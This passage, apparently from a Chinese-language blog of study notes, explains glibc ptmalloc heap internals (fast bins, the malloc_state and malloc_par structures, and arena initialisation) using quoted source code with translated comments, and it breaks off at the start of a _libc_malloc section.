src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739699606500.png"></p><ul><li>第一个宏将bin[1]设置位unsorted bin的chunk链表头，对top chunk初始化，<strong>暂时</strong>将其初始化位unsorted chunk，这仅仅是初始化一个值，该chunk内容肯定不能用于top chunk来分配内存：<strong>top chunk不属于任何一个bin</strong>，但ptmalloc有些check需要topchunk属于一个bin</li></ul><h2 id="5-2-4fast-bins"><a href="#5-2-4fast-bins" class="headerlink" title="5.2.4fast bins"></a>5.2.4fast bins</h2><ul><li><p>该bins用于提高内存分配效率</p></li><li><p>对SIZE_SZ为4或8B平台，小于64或128B的请求首先查看该bins是否有合适的chunk存在（精准匹配），若存在则直接返回</p></li><li><p>可看作是small bins的前7部分的cache，SIZE_SZ为4&#x2F;8B，每个bin的chunk大小依次为16&#x2F;32，24&#x2F;48，…..</p></li><li><p>32为平台下分配的内存大小和chunk大小和fast bins对应关系如下</p><p><img src="/1739718475251.png"></p><p>fast bins可看作LIFO的栈（last in,first out）</p><p><img src="/1739718784433.png"></p></li><li><p>根据fast bin的index获取fast bin的地址</p><p><img src="/1739718820501.png"></p></li><li><p>fastbin_index(sz)用于获得fast bin在fast bins数组中的index  </p><ul><li>SIZE_SZ为4&#x2F;8，将sz除以8&#x2F;16后-2（bin[0],bin[1]不存在）</li></ul></li></ul><p><img src="/1739720061537.png"></p><ul><li>根据SIZE_SZ的不同大小，MAX_FAST_SIZE为80B或160B</li><li>NFASTBINS为10（fast bins的数组大小）</li><li>FASTBIN_CONSOLIDATION_THRESHOLD 用于检查，当释放的chunk与该chunk相邻chunk合并后大于64KB，认为内存碎片较多，需要将fast bins中所有chunk都合并，减少内存碎片对系统的影响</li></ul><p><img src="/1739720458255.png"></p><ul><li>DEFAULT_MXFAST定义了默认fast bins中最大的chunk大小，SIZE_SZ为4&#x2F;8B，大小分别是64B&#x2F;128B</li><li>set_max_fast(s)将全局变量global_max_fast<strong>设置</strong>为DEAFAULT_MXFAST</li><li>get_max_fast()用于<strong>获得</strong>这个全局变量的值</li></ul><h1 id="5-3-核心结构体分析"><a href="#5-3-核心结构体分析" class="headerlink" title="5.3 核心结构体分析"></a>5.3 核心结构体分析</h1><p>ptmalloc使用malloc_state来管理分配区，参数管理用struct malloc_par</p><h2 id="5-3-1-malloc-state"><a href="#5-3-1-malloc-state" class="headerlink" title="5.3.1 malloc_state"></a>5.3.1 malloc_state</h2><p>struct malloc_state定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> &#123;</span><br> <span class="hljs-comment">/* Serialize access. */</span><br> <span class="hljs-comment">//序列化访问</span><br> <span class="hljs-type">mutex_t</span> mutex;<br> <span class="hljs-comment">/* Flags (formerly in max_fast). */</span><br> <span class="hljs-type">int</span> flags;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> THREAD_STATS</span><br>   <span class="hljs-comment">/* Statistics for locking. Only used if THREAD_STATS is defined. */</span>  <br>     <span class="hljs-comment">//用于锁定的数据，仅在THREAD_STATS定义时被使用</span><br> <span class="hljs-type">long</span> stat_lock_direct, stat_lock_loop, stat_lock_wait;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br> <span class="hljs-comment">/* Fastbins */</span><br> mfastbinptr fastbinsY[NFASTBINS];<br> <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br> <span class="hljs-comment">//top chunk的基地址不会被存储在其他bin中</span><br> mchunkptr top;<br> <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>     <span class="hljs-comment">//最近的一次分割请求产生的剩余块</span><br> mchunkptr last_remainder;<br> <span class="hljs-comment">/* Normal bins packed as described above */</span><br>     <span class="hljs-comment">//按描述的方式打包正常的bin</span><br> mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br> <span class="hljs-comment">/* Bitmap of bins */</span><br>     <span class="hljs-comment">//bin的位图</span><br> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[BINMAPSIZE];<br> <span class="hljs-comment">/* Linked list */</span><br>     <span class="hljs-comment">//链表</span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PER_THREAD</span><br> <span class="hljs-comment">/* Linked list for free arenas. */</span><br>     <span class="hljs-comment">//用于空闲区域（arena）的链表</span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br> <span class="hljs-comment">/* Memory allocated from the system in this arena. */</span><br>     <span class="hljs-comment">//此区域中从系统分配的内存</span><br> INTERNAL_SIZE_T system_mem;<br> INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>Mutex（互斥锁）用于串行化访问分配区，当有多线程访问同一分配区时，第一个获得mutex的线程可以访问该分配区，分配完成后释放mutex供其他线程使用</li><li>Flags记录分配区的标志，bit0记录分配区是否至少有一个fast bin chunk，bit1用于记录分配区是否能返回连续的虚拟地址空间</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> FASTCHUNKS_BIT held in max_fast indicates that there are probably</span><br><span class="hljs-comment"> some fastbin chunks. It is set true on entering a chunk into any</span><br><span class="hljs-comment"> fastbin, and cleared only in malloc_consolidate.</span><br><span class="hljs-comment"> The truth value is inverted so that have_fastchunks will be true</span><br><span class="hljs-comment"> upon startup (since statics are zero-filled), simplifying</span><br><span class="hljs-comment"> initialization checks.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//FASTCHUNKS_BIT 存储在 max_fast 中，表示可能存在一些快速分配区（fastbin）的块。当一个块被放入任何一个快速分配区时，该标志会被设置为 true，并且仅在 malloc_consolidate 函数中被清除。</span><br><span class="hljs-comment">//该标志的真假值被反转，以便在启动时 have_fastchunks 为 true（因为静态变量会被初始化为零），从而简化初始化检查。</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FASTCHUNKS_BIT (1U)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> ATOMIC_FASTBINS</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> clear_fastchunks(M) catomic_or (&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_fastchunks(M) catomic_and (&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> clear_fastchunks(M) ((M)-&gt;flags |= FASTCHUNKS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_fastchunks(M) ((M)-&gt;flags &amp;= ~FASTCHUNKS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> </span><br></code></pre></td></tr></table></figure><ul><li><p>上面的宏用于设置或置为flags中fast chunk的标志位bit0，0表示分配区有fast chunk，1表示没有</p></li><li><p>初始化完成的malloc_state中，flag值为0，表示该分配区有fast chunk，但<strong>实际上没有</strong>，试图从fast bins中分配chunk都会返回NULL</p></li><li><p>第一次调用malloc_consolidate()对fast bins进行chunk合并时，如果max_fast&gt;0，则调用clear_fastchunks，标志该分配区没有fast chunk（malloc_consolidate()会合并fast bins中所有chunk）</p></li><li><p>clear_fastchunks宏只在函数malloc_consolidate()中调用</p></li><li><p>当有fast chunk加入fast bins时，就调用set_fastchunks宏记录分配区的fast bins中存在fast chunk</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous</span><br><span class="hljs-comment"> regions. Otherwise, contiguity is exploited in merging together,</span><br><span class="hljs-comment"> when possible, results from consecutive MORECORE calls.</span><br><span class="hljs-comment"> The initial value comes from MORECORE_CONTIGUOUS, but is</span><br><span class="hljs-comment"> changed dynamically if mmap is ever used as an sbrk substitute.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//NONCONTIGUOUS_BIT 表示 MORECORE 不返回连续的内存区域。否则，会利用连续性，在可能的情况下，将连续的 MORECORE 调用的结果合并在一起。</span><br><span class="hljs-comment">//初始值来自 MORECORE_CONTIGUOUS，但如果 mmap 曾经被用作 sbrk 的替代品，这个值会被动态更改。</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NONCONTIGUOUS_BIT (2U)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> noncontiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_noncontiguous(M) ((M)-&gt;flags |= NONCONTIGUOUS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_contiguous(M) ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)</span><br></code></pre></td></tr></table></figure><ul><li>Flags的bit1为0表示MORCORE返回<strong>连续</strong>虚拟地址空间，为1表示返回<strong>非连续</strong>虚拟空间</li><li>对于主分配区，MORCORE其实为sbr()，是连续</li><li>对于非主分配区，使用mmap()分配大块虚拟内存，然后切分来模拟主分配区，而通常mmap是非连续的，所以<strong>非主分配区默认分配非连续虚拟地址空间</strong></li><li>malloc_state中声明了几个对锁的统计变量，默认没定义THREAD_STATS（编译时的选项，当其被定义时，ptmalloc会收集与线程相关的内存分配和释放的统计信息，例如每个线程的分配内存大小，分配次数等。），所以不会对锁使用情况进行统计</li><li>fastbinY有10个元素（NFSTBINS）的数组，用于存放fast chunk链表头指针，所以fast bins最多包含10个fast chunk的单向链表</li><li>top是一个chunk的指针，指向分配区的top chunk</li><li>last_remainder是一个chunk指针，分配区上次分配small chunk时从一个chunk裂出一个chunk返回给用户，剩余部分形成一个chuhnk，被last_remaider指向</li><li>bins用来存储unsorted bin,small bins和large bins的chunk链表头，small bins62个，large bins63个，共125个，bin[1]为unsorted bins链表头，bin[0],bin[127]不存在，所以共126bins，Bins数组共有  254（NBINS*2 – 2）个 mchunkptr  指针，这里由于size,pre_size,fd_nextsize,bk_nextsize对存储无意义，所以在SIZE_SZ为8的平台上，只需要126*2*8&#x3D;2016个字节即可，bins数组大小为（128*2-2）*8&#x3D;2032大小，最后16个字节被浪费掉了</li><li>binmap字段是一个int数组，ptmalloc用一个bit表示该bit对应的bin中有无空闲chunk</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> Binmap</span><br><span class="hljs-comment"> To help compensate for the large number of bins, a one-level index</span><br><span class="hljs-comment"> structure is used for bin-by-bin searching. `binmap&#x27; is a</span><br><span class="hljs-comment"> bitvector recording whether bins are definitely empty so they can</span><br><span class="hljs-comment"> be skipped over during during traversals. The bits are NOT always</span><br><span class="hljs-comment"> cleared as soon as bins are empty, but instead only</span><br><span class="hljs-comment"> when they are noticed to be empty during traversal in malloc.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/* Conservatively use 32 bits per map word, even if on 64bit system */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Binmap（位图）</span><br><span class="hljs-comment">为了弥补 bin 数量较多的问题，这里使用了一种单级索引结构来进行逐个 bin 的搜索。binmap 是一个位向量，用于记录 bin 是否绝对为空，以便在遍历时跳过这些空的 bin。这些位并不是在 bin 变为空时立即清零，而是在 malloc 遍历时发现 bin 为空时才清除。*/</span><br><span class="hljs-comment">/* 保守地使用 32 位来表示每个映射单元，即使在 64 位系统上也是如此 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BINMAPSHIFT 5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BITSPERMAP (1U &lt;&lt; BINMAPSHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BINMAPSIZE (NBINS / BITSPERMAP)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> idx2block(i) ((i) &gt;&gt; BINMAPSHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> idx2bit(i) ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT)-1))))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mark_bin(m,i) ((m)-&gt;binmap[idx2block(i)] |= idx2bit(i))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unmark_bin(m,i) ((m)-&gt;binmap[idx2block(i)] &amp;= ~(idx2bit(i)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> get_binmap(m,i) ((m)-&gt;binmap[idx2block(i)] &amp; idx2bit(i))</span><br></code></pre></td></tr></table></figure><ul><li>binmap一共28bit，16字节，4个int大小，binmap按int分成4个block，每个block有32bit，根据bin index可以用宏idx2block计算出该bin在binmap对应的bit属于哪个block</li><li>idx2bit宏取第i位为1，其他位都是0的掩码，比如idx2bit(3):0000 1000（低位向高位，从第0位开始）</li><li>mark_bin设置第i个bin在binmap中对应bit位为1，unmark_bin设置为0，get_binmap获取第i个bin对应的bit</li><li>next用于将分配区以单向链表链接起来</li><li>next_free将空闲分配区链接到单向链表中，仅当PER_THREAD定义时才定义该字段</li><li>system_mem字段记录当前分配区已分配内存大小</li><li>max_system_mem记录当前分配区最大能分配的内存大小</li></ul><h2 id="5-3-2-Malloc-par"><a href="#5-3-2-Malloc-par" class="headerlink" title="5.3.2 Malloc_par"></a>5.3.2 Malloc_par</h2><p>malloc_par定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> &#123;</span><br> <span class="hljs-comment">/* Tunable parameters */</span><br><span class="hljs-comment">/* 可调节参数 */</span><br> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> trim_threshold;<br> INTERNAL_SIZE_T top_pad;<br> INTERNAL_SIZE_T mmap_threshold;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PER_THREAD</span><br> INTERNAL_SIZE_T arena_test;<br> INTERNAL_SIZE_T arena_max;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br> <span class="hljs-comment">/* Memory map support */</span><br>     <span class="hljs-comment">/* 内存映射支持 */</span><br> <span class="hljs-type">int</span> n_mmaps;<br> <span class="hljs-type">int</span> n_mmaps_max;<br> <span class="hljs-type">int</span> max_n_mmaps;<br> <span class="hljs-comment">/* the mmap_threshold is dynamic, until the user sets</span><br><span class="hljs-comment"> it manually, at which point we need to disable any</span><br><span class="hljs-comment"> dynamic behavior. */</span><br><span class="hljs-comment">/* mmap_threshold 是动态的，直到用户手动设置它为止。在用户手动设置后，我们需要禁用任何动态行为。*/</span><br> <span class="hljs-type">int</span> no_dyn_threshold;<br> <span class="hljs-comment">/* Cache malloc_getpagesize */</span><br>    <span class="hljs-comment">/* 缓存 malloc_getpagesize 的值 */</span><br> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> pagesize;<br> <span class="hljs-comment">/* Statistics */</span><br> <span class="hljs-comment">/*数据*/</span><br> INTERNAL_SIZE_T mmapped_mem;<br> INTERNAL_SIZE_T max_mmapped_mem;<br> INTERNAL_SIZE_T max_total_mem; <span class="hljs-comment">/* only kept for NO_THREADS */</span><span class="hljs-comment">/* 仅用于 NO_THREADS 情况 */</span><br> <span class="hljs-comment">/* First address handed out by MORECORE/sbrk. */</span><br>     <span class="hljs-comment">/* 通过 MORECORE/sbrk 分配的第一个地址。*/</span><br> <span class="hljs-type">char</span>* sbrk_base;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>trim_threshold字段表示收缩阈值，<strong>默认128KB</strong>，当每个分配区top chunk大于该阈值时，会被free掉</li><li>由于mmap分配阈值的动态调整，在free时可能将收缩阈值修改为mmap的分配阈值的2倍<ul><li>64位下，mmap分配阈值32MB，所以收缩阈值64MB</li><li>32位下，mmap分配阈值512B，所以收缩阈值1MB</li></ul></li><li>收缩阈值可通过mllocpt()设置</li><li>top_pad表示分配时是否有添加额外的pad（额外添加的内存），默认是0。（ 在 glibc 的 ptmalloc 内存分配器中，<code>top_pad</code> 字段用于控制在初始化或扩展堆时，分配器会额外申请的内存大小。这个字段的默认值为 0，表示在分配内存时不会额外添加填充 ）</li><li>mmap_threshold表示mmap分配阈值，默认128KB。32位最大512KB，64位下最大32MB，由于默认开启mmap分配阈值动态调整，该字段会被动态调整，但不会超过最大值</li><li>area_test,arena_max用于PER_THREAD优化，32位下arena_test默认为2，64位：8<ul><li>当创建分配区数量达到arena_test时，系统会根据当前配置计算分配区最大数量，并将其设置为一个固定值</li><li>arena_max默认是0，表示分配区最大数量由arena_test决定，当系统中分配区数量达到arena_max时就不会创建新分配区而是通过重用已有的分配区</li><li>这两个值都可以通过mallopt()调整</li></ul></li><li>n_mmaps字段表示当前进程使用mmap()分配的内存块数量</li><li>n_mmaps_max表示<strong>进程</strong>使用mmap()分配内存块的最大数量，默认65536，可以使用mallopt()修改</li><li>max_n_mmaps表示<strong>当前进程</strong>使用mmap分配的内存块最大数量，以确保不会超过n_mmap_max， <code>max_n_mmaps</code> 的值通常由 <code>n_mmaps_max</code> 决定，用户通过调整 <code>n_mmaps_max</code> 来间接影响 <code>max_n_mmap</code> ，该字段是由于mstats()函数输出统计需要该字段</li><li>no_dyn_threshold表示是否开启mmap分配阈值的动态调整，默认值0，表示开启</li><li>pagsize表示系统的页大小，默认4KB</li><li>mmapped_mem和max_nmmapped_mem都用于统计mmap分配的内存大小，一般情况二者相等，max_mmapped_mem用于mstats()函数<ul><li>max_total_mem字段在<strong>单线程</strong>情况下用于统计进程分配的内存总数</li></ul></li><li>sbrk_base字段表示堆的起始地址</li></ul><h2 id="5-3-3分配区的初始化"><a href="#5-3-3分配区的初始化" class="headerlink" title="5.3.3分配区的初始化"></a>5.3.3分配区的初始化</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* There are several instances of this struct (&quot;arenas&quot;) in this</span><br><span class="hljs-comment"> malloc. If you are adapting this malloc in a way that does NOT use</span><br><span class="hljs-comment"> a static or mmapped malloc_state, you MUST explicitly zero-fill it</span><br><span class="hljs-comment"> before using. This malloc relies on the property that malloc_state</span><br><span class="hljs-comment"> is initialized to all zeroes (as is true of C statics). */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">在这个内存分配器中，存在多个这种结构体（“分配区”）。如果你正在以一种不使用静态分配或通过 mmap 映射的 malloc_state 的方式调整这个内存分配器，你必须在使用之前显式地将其清零。这个内存分配器依赖于 malloc_state 被初始化为全零的特性（这与 C 语言中静态变量的初始化行为一致）。</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> <span class="hljs-title">main_arena</span>;</span><br><span class="hljs-comment">/* There is only one instance of the malloc parameters. */</span><br><span class="hljs-comment">/* 只有一个实例的内存分配参数。*/</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> <span class="hljs-title">mp_</span>;</span><br><span class="hljs-comment">/* Maximum size of memory handled in fastbins. */</span><br><span class="hljs-comment">/* fastbins 中处理的内存块的最大大小。*/</span><br><span class="hljs-type">static</span> INTERNAL_SIZE_T global_max_fast;<br></code></pre></td></tr></table></figure><ul><li>main_arena：主分配区，任何进程有且仅有一个主分配区</li><li>mp_：全局唯一malloc_par实例，用于参数管理和统计信息，比如<ul><li><code>mp_</code> 包含了内存分配器的各种可调节参数，例如 <code>mmap_threshold</code>（使用 <code>mmap</code> 分配的阈值）、<code>trim_threshold</code>（堆收缩的阈值）等。</li><li>它还记录了一些统计信息，例如当前的内存使用情况、分配的内存块数量等。</li></ul></li><li>global_max_fast全局变量表示fast bins中最大chunk的大小</li></ul><p>main_arena初始化函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> Initialize a malloc_state struct.</span><br><span class="hljs-comment"> This is called only from within malloc_consolidate, which needs</span><br><span class="hljs-comment"> be called in the same contexts anyway. It is never called directly</span><br><span class="hljs-comment"> outside of malloc_consolidate because some optimizing compilers try</span><br><span class="hljs-comment"> to inline it at all call points, which turns out not to be an</span><br><span class="hljs-comment"> optimization at all. (Inlining it in malloc_consolidate is fine though.)</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> __STD_C</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">malloc_init_state</span><span class="hljs-params">(mstate av)</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">malloc_init_state</span><span class="hljs-params">(av)</span> mstate av;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#123;<br> <span class="hljs-type">int</span> i;<br> mbinptr bin;<br> <span class="hljs-comment">/* Establish circular links for normal bins */</span><br> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; NBINS; ++i) &#123;<br> bin = bin_at(av,i);<br> bin-&gt;fd = bin-&gt;bk = bin;<br> &#125;<br><span class="hljs-comment">//设置非主分配区</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> MORECORE_CONTIGUOUS</span><br> <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br> set_noncontiguous(av);<br><span class="hljs-comment">//初始化主分配区</span><br> <span class="hljs-keyword">if</span> (av == &amp;main_arena)<br> set_max_fast(DEFAULT_MXFAST);<br><span class="hljs-comment">//设置标志位</span><br> av-&gt;flags |= FASTCHUNKS_BIT;<br><span class="hljs-comment">//初始化top chunk</span><br> av-&gt;top = initial_top(av);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>分配区初始化函数默认分配区的实例av是全局静态变量或已经将av所有字段清0</li><li>初始化：遍历所有bins，将每个bin中空闲链表置空，就是将bin的fd，bk都指向bin本身</li><li>由于默认av为0，即默认分配连续虚拟地址空间，但只有<strong>主分配区才可以分配连续的</strong>，所以对于非主分配区，需要设置其为分配非连续虚拟地址空间</li><li>若初始化主分配区，则需要设置global_max_fast，由于主分配区最先被初始化，这保证global_max_fast只被初始化一次。由此，如果global_max_fast值非0，那么意味着主分配区已经被初始化</li><li>最后初始化top chunk</li></ul><p>Ptmalloc参数初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Set up basic state so that _int_malloc et al can work. */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">ptmalloc_init_minimal</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> DEFAULT_TOP_PAD != 0</span><br> mp_.top_pad = DEFAULT_TOP_PAD;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">//mmap参数设置</span><br> mp_.n_mmaps_max = DEFAULT_MMAP_MAX;<br> mp_.mmap_threshold = DEFAULT_MMAP_THRESHOLD;<br><span class="hljs-comment">//内存收缩阈值设置</span><br> mp_.trim_threshold = DEFAULT_TRIM_THRESHOLD;<br><span class="hljs-comment">//页</span><br> mp_.pagesize = malloc_getpagesize;<br><span class="hljs-comment">//线程本地分配区数量      </span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PER_THREAD</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof(long) == 4 ? 2 : 8))</span><br> mp_.arena_test = NARENAS_FROM_NCORES (<span class="hljs-number">1</span>);<br> narenas = <span class="hljs-number">1</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>主要将全局变量mp_字段初始化为默认值</li><li>若定义编译选项PER_THREAD，会根据cpu核心数计算分配区数量<ul><li>32位每个核心2分配区</li><li>64位每个核心8分配区</li></ul></li></ul><h1 id="glibc-2-23"><a href="#glibc-2-23" class="headerlink" title="glibc-2.23"></a>glibc-2.23</h1><h2 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="_libc_malloc"></a>_libc_malloc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 